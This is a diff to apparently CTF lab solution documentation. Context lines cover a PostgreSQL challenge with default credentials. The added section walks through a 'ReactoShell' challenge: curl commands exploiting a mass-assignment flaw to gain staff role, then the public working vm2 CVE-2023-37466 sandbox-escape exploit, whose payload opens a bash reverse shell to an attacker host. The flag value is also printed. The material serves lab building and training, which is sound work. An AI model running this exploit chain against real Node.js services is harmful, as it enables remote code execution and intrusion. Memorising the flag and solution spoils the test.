@@ -128,3 +128,38 @@ machine.
 - PostgreSQL is published directly on `5432:5432` with `POSTGRES_USER=postgres` / `POSTGRES_PASSWORD=postgres` / `POSTGRES_DB=blueoffice`, and the official image's default `pg_hba.conf` already allows password auth from any host (no config override needed) so `psql -h <TARGET_IP> -p 5432 -U postgres -d blueoffice` (password `postgres`) succeeds unmodified.
 - `\l` shows a second database, `flags`, seeded alongside the realistic `blueoffice` corporate schema (`clients`, `employees`, `departments`, `deals`, `invoices`, `projects`, `users`). `flags.users` holds several believable service accounts (`backup_service`, `audit_reader`, `hr_sync`, `reporting_bot`, `svc_monitoring`, `db_replication`, `etl_pipeline`, `vendor_integration`); the flag is hidden inside `legacy_admin`'s `internal_note`, phrased as a migration/audit note about a never-rotated bootstrap password. The flag is not the username, not in any table named for flags, not in `docker-compose.yml`, not in an env var, and never printed to the container's startup logs - it only ever exists inside the seeded row.
 - Seed data lives in `services/postgres5432-weak-creds/postgres-init/01-blueoffice.sql` (blueoffice schema/data) and `02-flags.sql` (the `flags` database and the flag row), baked into the image at build time via Dockerfile `COPY` - no host bind-mount.
+
+### 21. ReactoShell — mass assignment privesc + real vm2 CVE-2023-37466 RCE (flag18)
+- **Location:** `reactoshell3001-vmescape` container, `/opt/aramoon/flag_reactoshell.txt` (owner-readable only, `chmod 400`)
+- **Content:** `CTF{Re4cT_T0_5hE11_EXp10t4T10n_5uCc2ss}`
+- "Aramoon" — a small multi-page student platform (`/`, `/programs`, `/ecosystem`, `/services`, `/institution` marketing pages; `/register`, `/login`, `/dashboard`, `/profile` behind a real cookie session). This is a genuine two-stage chain — there is no shortcut URL to guess; both stages must be exploited in order.
+  1. **Privilege escalation via mass assignment.** `PATCH /api/profile` (the endpoint the profile-edit form on `/profile` calls) does `Object.assign(req.user, req.body)` with no field allowlist — the form only ever sends `{username, bio, github}`, but any other JSON field rides along unchecked. Register a normal account, then:
+     ```bash
+     curl -c cookies.txt -X POST http://<TARGET_IP>:3001/api/register \
+       --data-urlencode "username=Player" --data-urlencode "email=p@example.com" --data-urlencode "password=hunter22"
+     curl -b cookies.txt -X PATCH http://<TARGET_IP>:3001/api/profile \
+       -H 'Content-Type: application/json' --data '{"role":"staff"}'
+     ```
+     `/dashboard` now shows a "Staff Tools" card linking to `/staff/tools/reactoshell`; both that page and its render API 403 for role `student`, so this step is mandatory, not optional.
+  2. **Real RCE: CVE-2023-37466 (vm2 sandbox escape, CVSS 9.8).** `/staff/tools/reactoshell` is a "component preview" tool whose `POST .../api/render` runs the submitted `code` through the **real, unmodified `vm2` npm package pinned at 3.9.19** (the last version before the fix in 3.10.0) — not a hand-rolled sandbox. 3.9.19 is genuinely vulnerable to the disclosed "Promise `[Symbol.species]` handler sanitization bypass" (public PoC: https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9). The exact public PoC works unmodified against this box (verified end-to-end):
+     ```js
+     async function fn() {
+         (function stack() { new Error().stack; stack(); })();
+     }
+     p = fn();
+     p.constructor = {
+         [Symbol.species]: class FakePromise {
+             constructor(executor) {
+                 executor(
+                     (x) => x,
+                     (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"'); }
+                 )
+             }
+         }
+     };
+     p.then();
+     ```
+     Submitted as the `code` field of `POST /staff/tools/reactoshell/api/render` (with the `staff`-role session cookie from step 1), against an `nc -lvnp <PORT>` listener. Lands a reverse shell as `reactoapp` inside the container.
+- In the shell: `cat /opt/aramoon/flag_reactoshell.txt`.
+- `/opt/aramoon/README_INTERNAL.txt` is a post-exploitation flavor/confirmation note that names the exact CVE (only readable after RCE, so it's not a pre-solve spoiler); `/opt/aramoon/notes.txt` is an unrelated decoy note (a Nabil/JWT-secret-rotation easter egg, cross-referencing challenge 16's `jwt-weak-secret`).
+- No naive keyword blacklist exists on the render endpoint in this version — the only barrier before the render API is the staff-role gate from step 1; the vm2 CVE itself is the entire "hard" part.
